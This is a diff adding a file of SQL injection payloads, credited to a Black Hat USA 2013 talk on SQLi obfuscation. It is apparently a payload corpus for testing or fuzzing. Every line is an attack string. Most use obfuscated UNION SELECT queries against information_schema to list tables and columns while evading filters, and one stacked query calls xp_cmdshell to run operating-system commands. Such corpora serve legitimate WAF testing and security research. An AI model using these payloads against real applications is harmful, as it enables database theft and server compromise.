@@ -1,0 +1,36 @@
+#
+# from
+# Roberto Salgado
+# SQLi Optimization and Obfuscation Techniques
+# Black Hat USA 2013
+
+#
+# Slide 83
+#
+-1 UNION SELECT table_name Websec FROM information_schema.tables LIMIT 1
+-1 UNION%0ASELECT table_name FROM information_schema.tables LIMIT 1
+
+# note changed "FROM table" to "FROM table_name"
+# and "column" to "column_name"
+-1fUNION SELECT column_name FROM table_name
+
+1; DECLARE @test AS varchar(20); EXEC master.dbo.xp_cmdshell 'cmd'
+-[id] UNION SELECT table_name FROM information_schema.tables LIMIT 1
+{d 2} UNION SELECT table_name FROM information_schema.tables LIMIT 1
+
+#
+# Slide 84
+#
+1 between 1 AND`id` having 0 union select table_name from information_schema.tables
+1 mod /*!1*/ union select table_name from information_schema.tables--
+true is not unknown for update union select table_name from information_schema.tables
+test'-1/1/**/union(select table_name from information_schema.tables limit 1,1)
+-1 union select @``"", table_name from information_schema.tables
+-1 LOCK IN SHARE MODE UNION SELECT table_name from information_schema.tables
+$.``.id and 0 union select table_name from information_schema.tables
+-(select @) is unknown having 1 UNION select table_name from information_schema.tables
+/*!911111*//*!0*/union select table_name x from information_schema.tables limit 1
+-1.for update union select table_name from information_schema.tables limit 1
+-0b01 union select table_name from information_schema.tables limit 1
+1<binary 1>2 union select table_name from information_schema.tables limit 1
+-1 procedure analyse(1gfsdgfds, sfg) union select table_name from information_schema.tables limit 1
